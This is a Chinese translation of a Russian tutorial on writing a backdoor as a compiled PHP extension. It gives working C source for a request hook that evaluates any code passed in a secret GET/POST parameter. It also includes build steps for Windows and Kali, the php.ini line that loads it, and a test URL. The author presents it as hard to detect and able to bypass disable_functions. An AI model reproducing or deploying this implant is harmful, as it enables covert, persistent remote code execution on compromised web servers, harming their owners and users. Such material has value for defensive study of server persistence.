# 编写基于PHP扩展库的后门

from:[http://stackoff.ru/pishem-rasshirenie-bekdor-dlya-php/](http://stackoff.ru/pishem-rasshirenie-bekdor-dlya-php/)

0x00 前言
-------

* * *

今天我们将讨论编写基于PHP扩展库的后门。通常来说，大部分入侵者都会在脚本中留下自定义代码块后门。当然，这些东西很容易通过源代码的静态或动态分析找到。

利用PHP扩展库的好处显而易见：

```
很难寻找
绕过disable_functions选项 
有能力控制所有的代码
访问代码执行的API

```

但是我们需要有编辑PHP配置文件的能力。

0x01 细节
-------

* * *

//【译者注：用linux两条命令搞定了，何必windows费这么大劲】 作为例子，我会用Windows来写。写扩展我用的Visual Studio 2012 Express版本。还需要的源代码最新版本，编译PHP库（可从同一来源收集）。为简单起见，我们需要是的php-5.5.15-Win32的VC11-86和源PHP-5.5.15-src.zip

解压使用C编译PHP:PHP，源代码在C:PHP-SRC。

然后，你需要进行一些设置。

1）添加预处理器定义：

```
ZEND_DEBUG=0 
ZTS=1
ZEND_WIN32 
PHP_WIN32 

```

![enter image description here](http://drops.javaweb.org/uploads/images/4dfcb5eff9228c27c7e82c19433ae44b07cc1a64.jpg)

预处理器定义 2）添加的目录，用于连接源：

```
C: PHP-SRCmain
C: PHP-SRCend
C: PHP-SRCTSRM
C: PHP-SRC
egex
C: PHP-SRC 

```

![enter image description here](http://drops.javaweb.org/uploads/images/5061f05e2edb25ba1a9854b4c7a5972769bd341c.jpg)

其他目录连接

3）添加其他目录中liboy php5ts.lib（C： PHP dev的）

![enter image description here](http://drops.javaweb.org/uploads/images/b0e857445b7d9008b6b3139b41f356f7fa73e38c.jpg)

其他目录库 4）添加连接库php5ts.lib。

![enter image description here](http://drops.javaweb.org/uploads/images/73a1b303fecc588b87cc9c9e9924d5c66ce4838a.jpg)

装配额外的库

5）指定收集文件的路径。

![enter image description here](http://drops.javaweb.org/uploads/images/6494d09d32e9f3e94c96d5eaa6de5630ca97853b.jpg)

保存配置文件 配置参数为Workspace扩展的开发后（详情可以在http://blog.slickedit.com/2007/09/creating-a-php-5-extension-with-visual-c-2005/找到），创建一个新的项目类型后门“控制台应用程序的Win32”。

![enter image description here](http://drops.javaweb.org/uploads/images/7f0ee536980064eb70788956761419b4baa3f2a1.jpg)

在Visual StudioVyberem型“库DLL»项目” 选择合适类型

![enter image description here](http://drops.javaweb.org/uploads/images/348f34d1432acdce03d7108680d6d221a07d838b.jpg)

然后，从项目中删除不必要的文件。应该只需要backdoor.cpp，STDAFX.CPP和stdafx.h中。

在头文件stdafx.h中 ：

```
#pragma once
#ifndef STDAFX
#define STDAFX
#include "zend_config.w32.h" 
#include "php.h"
#endif

```

现在，我们直接进入PHP扩展的代码。删除所有行，并添加所需的文件连接。

```
#include "stdafx.h"
#include "zend_config.w32.h"
#include "php.h"

```

如果workspace设置已经正确，警告就会消失。 当模块被初始化时，会有几个事件，其中每一个都在特定条件下发生。我们需要在查询执行时，去执行我们的代码。要做到这一点，你必须初始化我们所需要的功能，我给它命名为«hideme»。 PHP_RINIT_FUNCTION(hideme); 然后你可以去看模块的初始化。

```
zend_module_entry hideme_ext_module_entry = {
    STANDARD_MODULE_HEADER,
    "simple backdoor",
    NULL,
    NULL,
    NULL,
    PHP_RINIT(hideme),
    NULL, 
    NULL,
    "1.0",
    STANDARD_MODULE_PROPERTIES
};
ZEND_GET_MODULE(hideme_ext);

```

在这篇文章中，我们只需要加载中代码被执行即可，因此运行和卸载模块由空取代。 现在，你可以去看hideme的函数体。

```
PHP_RINIT_FUNCTION(hideme)
{

    char* method = "_POST"; //超全局数组，从中我们采取perametr和价值   char* secret_string = "secret_string"; //参数，这将是运行的代码    
    //【译者注：在原文作者的github代码中method是get，secret_string是execute，请大家按照github代码进行测试，不修改原文了】
    zval** arr;
    char* code;

    if (zend_hash_find(&EG(symbol_table), method, strlen(method) + 1, (void**)&arr) != FAILURE) { 
        HashTable* ht = Z_ARRVAL_P(*arr);
        zval** val;
        if (zend_hash_find(ht, secret_string, strlen(secret_string) + 1, (void**)&val) != FAILURE) { //查找散列表中所需的参数          
    code =  Z_STRVAL_PP(val); //值
    zend_eval_string(code, NULL, (char *)"" TSRMLS_CC); //代码执行
        }
    }
    return SUCCESS;
}

```

注释应该比较清楚。最初，我们设置HTTP方法和参数secret_string。然后再寻找正确的数组参数，如果有的话，我们就从它的值中取指令，并通过zend_eval_string执行代码。 编译后的所得，即可作为一个扩展库。

下载源代码

[https://github.com/akamajoris/php-extension-backdoor](https://github.com/akamajoris/php-extension-backdoor)

0x02 测试
-------

* * *

//以下为译者测试截图：

![enter image description here](http://drops.javaweb.org/uploads/images/b84da5d4e13e2529449ec8a0b23ebf5ec7ab7ba9.jpg)

```
http://127.0.0.1:1629/20140917/test.php?execute=phpinfo();

```

（因为原作者github代码设置的是execute）

Linux编译（kali）

```
apt-get install php5-dev
phpize && ./configure && make

```

在kali下测试一遍成功，我比较懒，直接chmod后把so复制到/var/www了哈哈

然后php.ini加上

```
extension=/var/www/back.so

```

重启apache，测试成功